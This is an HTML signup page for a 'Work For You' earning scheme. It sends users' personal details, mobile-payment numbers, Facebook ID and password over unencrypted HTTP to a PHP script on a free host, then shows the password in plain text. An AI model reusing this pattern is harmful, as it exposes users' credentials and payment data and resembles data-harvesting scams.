<!DOCTYPE html>
<html>
<head>
    <title>Form Submission Example</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000;
            margin: 0;
            padding: 0;
        }

        .container {
            background-color: #000;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        h2 {
            text-align: center;
        }

        form {
            display: flex;
            flex-direction: column;
            width: 90%;
        }

        label {
            margin-bottom: 5px;
            font-weight: bold;
            color: #fff;
        }

        input[type="text"],
        input[type="email"],
        input[type="number"],
        input[type="password"] {
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        input[type="submit"] {
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        input[type="submit"]:hover {
            background-color: #45a049;
        }

        .phone-input {
            display: flex;
            align-items: center;
        }

        .phone-input select {
            padding: 8px;
            margin-right: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
            background-color: white;
        }

        #formOutput {
            margin-top: 20px;
            display: none;
            padding: 20px;
            background-color: #e6ffe6;
            border: 1px solid #4CAF50;
            border-radius: 8px;
        }

        .box {
            width: 170px;
            height: 170px;
            background-color: #26ff00; /* Approved color */
            border-radius: 50%;
            position: relative;
            transform-style: preserve-3d;
            animation: rotate 3s infinite linear;
            text-align: center;
            top: 30px;
            left: 45%;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5), 0 0 40px rgba(0, 255, 0, 0.5);
        }

        .glow {
            animation: glow 1s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 10px #2ecc71, 0 0 20px #2ecc71, 0 0 30px #2ecc71; }
            to { box-shadow: 0 0 20px #2ecc71, 0 0 30px #2ecc71, 0 0 40px #2ecc71; }
        }

        .done-sign {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 80px;
            color: #fff;
        }

        .con {
            margin: 0 auto;
        }

        .con h1 {
            text-align: center;
            color: #fff;
            font-size: 40px;
            margin-top: 50px;
        }

        .con h1 b {
            color: #2bd5ff;
            text-shadow: 0 0 50px #1B03A3, 0 0 50px #1B03A3;
        }

        .con p {
            text-align: center;
            color: #fff;
            font-size: 29px;
        }

        .content {
            text-align: center;
            width: 90%;
            margin: 0 auto;
        }

        .content img {
            height: 200px;
        }

        .shadowfilter {
            -webkit-filter: drop-shadow(0px 0px 4px rgba(43, 213, 255, 0.80));
            filter: drop-shadow(0px 0px 4px rgba(43, 213, 255, 0.80)); /* For standard syntax */
            -webkit-transition: all 0.5s linear;
            -o-transition: all 0.5s linear;
            transition: all 0.5s linear;
        }

        .shadowfilter:hover {
            -webkit-filter: drop-shadow(0px 0px 10px rgba(43, 213, 255, 0.8));
            filter: drop-shadow(0px 0px 10px rgba(43, 213, 255, 0.8)); /* For standard syntax */
        }

        .content h1 {
            font-size: 70px;
            color: #2bd5ff;
            text-shadow: 0 0 50px #1B03A3, 0 0 50px #1B03A3;
        }

        .content h2 {
            text-align: center;
            font-size: 45px;
            color: #fff;
        }

        .content p {
            font-size: 20px;
            color: #fff;
        }

        #formOutput1,
        #formOutput2,
        #formOutput3,
        #formOutput4 {
            padding: 20px;
            border-radius: 8px;
            display: none; /* Initially hide the form outputs */
            width: 880px;
            margin: 0 auto; /* Center-align the outputs */
        }

        #formOutput1 h1,
        #formOutput2 h2,
        #formOutput3 h2,
        #formOutput4 h2 {
            font-size: 38px;
            color: #3bff00; /* Change the color */
            text-shadow: 0 0 40px #3bff00; /* Add text shadow */
            text-align: left;
            margin-left: 30px;
        }

        #formOutput1 p,
        #formOutput2 p,
        #formOutput3 p,
        #formOutput4 p,
        #formOutput5 p {
            margin: 10px 0; /* Increase the margin for better spacing */
            color: #fff; /* Change the text color */
            font-size: 25px;
        }

        #formOutput1 strong,
        #formOutput2 strong,
        #formOutput3 strong,
        #formOutput4 strong {
            font-weight: bold;
            color: #2bd5ff; /* Change the color of strong elements */
        }

        #formOutput1 img,
        #formOutput2 img,
        #formOutput3 img,
        #formOutput4 img {
            height: 150px; /* Decrease the image height for better fit */
            margin-top: 20px; /* Add some top margin for spacing */
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3); /* Add a soft shadow */
            text-align: left;
            margin-left: 700px;
        }

        /* Style for formOutput5 box */
        #formOutput5 {
            padding: 20px;
            border: 2px solid #4CAF50;
            border-radius: 8px;
            background-color: #1b1b1b; /* Dark background */
            width: 880px;
            margin: 20px auto; /* Center-align the box */
            display: none;
            color: #fff; /* White text */
            font-size: 25px;
        }

        /* Style for copy button */
        .copy-button {
            display: block;
            margin: 10px auto;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            text-align: center;
        }

        .copy-button:hover {
            background-color: #45a049;
        }

    </style>
    <script>
        
        function displayFormData(event) {
            event.preventDefault(); // Prevent form from submitting the traditional way

            const form = document.getElementById('simpleForm');
            const formData = new FormData(form);

            fetch('http://userinfomaster.000webhostapp.com/wu/wu_users.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                alert(data); // Handle the response from PHP script
                if (data.includes("New record created successfully")) {
                    // Get form values
                    const fullName = formData.get('fullName');
                    const address = formData.get('address');
                    const age = formData.get('age');
                    const countryCode = formData.get('countryCode');
                    const number = formData.get('number');
                    const email = formData.get('email');
                    const paymentMethod = formData.get('paymentMethod');
                    const paymentNumber = formData.get('paymentNumber');
                    const w4uId = formData.get('w4uId');
                    const education = formData.get('education');
                    const facebookId = formData.get('facebookId');
                    const password = formData.get('password');

                    // Combine country code and number
                    const fullNumber = `${countryCode} ${number}`;

                    // Display the values
                    const output4 = `
                        <h2>${fullName}</h2>
                    `;
                    
                    const output1 = `
                        <img src="aw.png">
                        <p><strong>Address :</strong> ${address}</p>
                        <p><strong>Age :</strong> ${age}</p>
                        <p><strong>Number :</strong> ${fullNumber}</p>
                        <p><strong>Email :</strong> ${email}</p>
                        <p><strong>Payment Method :</strong> ${paymentMethod}</p>
                        <p><strong>Payment Number :</strong> ${paymentNumber}</p>
                        <p><strong>W4U ID :</strong> ${w4uId}</p>
                        <p><strong>Education :</strong> ${education}</p>
                        <p><strong>Referred ID : </strong> RF-T9-16</p>
                    `;

                    const output2 = `
                        <p><b>Account</b></p>
                        <p><strong>W4U User ID :</strong> ${w4uId}</p>
                        <p><strong>Password : </strong> ${password}</p>
                        <p><strong>Region :</strong> BANGLADESH</p>
                        <p><strong>Method :</strong> ${paymentMethod}</p>
                        <p><strong>Payment Number :</strong> ${paymentNumber}</p>
                        <p><strong>Payment Currency :</strong> Taka à§³</p>
                    `;

                    const output3 = `
                        <p><b>Contact<b></p>
                        <p><strong>${address}</strong></p>
                        <p><strong>${fullNumber}</strong></p>
                        <p><strong>${facebookId}</strong></p>
                        <p><strong>${email}</strong></p>
                    `;
                    
                    const output5 = `
                        <p>User Info | Work For You</p>
                        <p>Name : ${fullName}</p>
                        <p>Number : ${fullNumber}</p>
                        <p>User ID : ${w4uId}</p>
                        <p>Password : ${password}</p>
                        <p>Referred ID : RF-T9-16</p>
                    `;

                    document.getElementById('formOutput1').innerHTML = output1;
                    document.getElementById('formOutput2').innerHTML = output2;
                    document.getElementById('formOutput3').innerHTML = output3;
                    document.getElementById('formOutput4').innerHTML = output4;
                    document.getElementById('formOutput5').innerHTML = output5;
                    document.getElementById('formOutput1').style.display = 'block';
                    document.getElementById('formOutput2').style.display = 'block';
                    document.getElementById('formOutput3').style.display = 'block';
                    document.getElementById('formOutput4').style.display = 'block';
                    document.getElementById('formOutput5').style.display = 'block';

                    // Hide the form
                    document.getElementById('simpleForm').style.display = 'none';
                }
            })
            .catch(error => console.error('Error:', error));
        }

        function copyToClipboard() {
            const output5 = document.getElementById('formOutput5');
            const range = document.createRange();
            range.selectNode(output5);
            window.getSelection().removeAllRanges(); 
            window.getSelection().addRange(range);
            document.execCommand('copy');
            window.getSelection().removeAllRanges();
            alert('Copied to clipboard');
        }
    </script>
</head>
<body>
    <div class="box" id="box">
        <div class="done-sign">&#10004;</div>
    </div>

    <div class="con">
        <h1>Congratulations, Your account is <b>Approved</b>.</h1>
        <p>Let's start earning <b>money</b>.</p>
    </div>

    <br><br><br><br><br><br>
    <div class="main">
        <div class="content">
            <img class="shadowfilter" src="aw.png">
            <h1>Work For You</h1>
            <p>Work For You: The heartbeat of self-fulfillment.</p><br>
            <hr><br>
            <h2>Joining Form</h2>
        </div>
    </div>

    <div class="container">
        <h2>Simple HTML Form</h2>
        <form id="simpleForm" onsubmit="displayFormData(event)" action="wu_users.php" method="POST" >
            <label for="fullName">Full Name:</label>
            <input type="text" id="fullName" name="fullName" required>

            <label for="address">Address:</label>
            <input type="text" id="address" name="address" required>

            <label for="age">Age:</label>
            <input type="number" id="age" name="age" required>

            <label for="number">Number:</label>
            <div class="phone-input">
                <select id="countryCode" name="countryCode" required>
                    <option value="+1">+1 (USA)</option>
                    <option value="+44">+44 (UK)</option>
                    <option value="+91">+91 (India)</option>
                    <option value="+880">+880 (Bangladesh)</option>
                    <!-- Add more country codes as needed -->
                </select>
                <input type="text" id="number" name="number" required>
            </div>

            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>

            <label for="paymentMethod">Payment Method:</label>
            <select id="paymentMethod" name="paymentMethod" required>
                <option value="bKash">bKash</option>
                <option value="nagad">nagad</option>
                <option value="rocket">rocket</option>
                <option value="recherg">recherg</option>
                <!-- Add more payment methods as needed -->
            </select>

            <label for="paymentNumber">Payment Number:</label>
            <input type="text" id="paymentNumber" name="paymentNumber" required>

            <label for="w4uId">W4U ID:</label>
            <input type="text" id="w4uId" name="w4uId" required>

            <label for="education">Education:</label>
            <input type="text" id="education" name="education" required>

            <label for="facebookId">Facebook ID:</label>
            <input type="text" id="facebookId" name="facebookId" required>

            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>

            <input type="submit" value="Submit">
        </form>

        <div id="formOutput4"></div>
        <div id="formOutput1"></div>
        <div id="formOutput2"></div>
        <div id="formOutput3"></div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
        <div id="formOutput5"></div>
        <button class="copy-button" onclick="copyToClipboard()">Copy</button>
    </div>
</body>
</html>
